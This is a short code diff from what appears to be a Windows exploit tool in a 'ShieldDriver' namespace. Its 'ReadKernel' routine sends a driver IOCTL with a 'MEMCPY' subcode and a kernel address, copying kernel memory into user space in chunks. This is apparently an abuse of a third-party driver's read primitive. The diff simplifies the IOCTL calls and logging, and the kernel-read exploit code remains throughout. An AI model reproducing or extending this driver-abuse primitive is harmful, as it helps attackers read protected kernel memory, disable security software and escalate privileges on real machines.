@@ -40,36 +40,23 @@ namespace ShieldDriver {
             req.header[0] = sizeof(req);
             req.magic = SHIELD_MAGIC;
             req.subcode = SHIELD_SUBCODE_MEMCPY;
-            req.direction = 1; // Read from kernel
+            req.direction = 1;
             req.size = chunkSize;
             req.kernel_address = currAddr;
 
             DWORD bytesReturned = 0;
             BOOL res = DeviceIoControl(
                 hDevice,
-                0x96102018, // Try 0x96102018 first (which explicitly sets IoStatus.Information)
+                SHIELD_IOCTL_CODE,
                 &req, sizeof(req),
                 &req, sizeof(req),
                 &bytesReturned, nullptr
             );
 
-            if (!res || bytesReturned == 0) {
-                // Fallback to 0x96102014
-                res = DeviceIoControl(
-                    hDevice,
-                    SHIELD_IOCTL_CODE,
-                    &req, sizeof(req),
-                    &req, sizeof(req),
-                    &bytesReturned, nullptr
-                );
-            }
-
             if (!res) {
-                printf("[!] DeviceIoControl failed: %lu (0x%X)\n", GetLastError(), GetLastError());
+                printf("[!] ReadKernel DeviceIoControl failed: %lu\n", GetLastError());
                 return false;
             }
-
-            printf("[*] DeviceIoControl ret=%lu bytes (val=0x%04X)\n", bytesReturned, *(uint16_t*)req.buffer);
 
             memcpy(outPtr, req.buffer, chunkSize);
 
